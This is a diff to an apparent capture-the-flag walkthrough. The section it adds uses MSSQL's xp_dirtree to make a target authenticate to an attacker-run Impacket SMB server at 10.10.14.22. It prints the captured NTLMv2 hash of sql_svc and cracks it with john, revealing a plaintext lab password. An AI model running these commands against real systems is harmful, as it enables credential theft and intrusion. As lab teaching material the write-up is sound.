@@ -323,7 +323,7 @@ SQL (PublicUser  guest@master)> enable_xp_cmdshell
 [-] ERROR(DC\SQLMOCK): Line 105: User does not have permission to perform this action.
 [-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
 [-] ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
-[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
+<[-] ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
 ```
 
 <br />
@@ -340,5 +340,88 @@ SQL (PublicUser  guest@master)> xp_cmdshell whoami
 <br />
 
 ## Get NTLMv2 Hash:
+
+<br />
+
+Another technique we can leverage on the MSSQL Server is the `xp_dirtree` function.
+
+This function allows us to retrieve a `directory listing` from the file system.
+
+What's particularly interesting is that, if we point it to a network path hosted by an `Impacket server` running on our machine, we might be able to capture the `NTLM` hash of the user executing the query on the target system.
+
+So, first we will host the server using `impacket-server`:
+
+<br />
+
+```bash
+❯ impacket-smbserver Folder $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+<br />
+
+Then, we run xp_dirtree targeting our server:
+
+<br />
+
+```bash
+SQL (PublicUser  guest@master)> xp_dirtree \\10.10.14.22\Folder
+subdirectory   depth   file
+------------   -----   ----
+```
+
+<br />
+
+And check the impacket-server:
+
+<br />
+
+```bash
+❯ impacket-smbserver Folder $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.11.202,55308)
+[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
+[*] User DC\sql_svc authenticated successfully
+[*] sql_svc::sequel:aaaaaaaaaaaaaaaa:a47f2bd3187c0730f2b6f55794322452:0101000000000000804931a638bcdb01db5166ebaa9fe9900000000001001000770067004f0049004b0052004500540003001000770067004f0049004b00520045005400020010006b00560064004500470063006c006100040010006b00560064004500470063006c00610007000800804931a638bcdb010600040002000000080030003000000000000000000000000030000029c82ea33e7042d6719019b8a652da06691eb0d187880fc1f18597c4f97d3b040a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320032000000000000000000
+[*] Closing down connection (10.10.11.202,55308)
+[*] Remaining connections []
+```
+
+<br />
+
+GG! We have a `NTLMv2` hash from the user `sql_svc`.
+
+Let's try to crack it using `john`:
+
+<br />
+
+```bash
+❯ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+REGGIE1234ronnie (sql_svc)     
+...[snip]...
+
+```
+
+<br />
+
+We have new credentials: `sql_svc:REGGIE1234ronnie`
 
 <br />
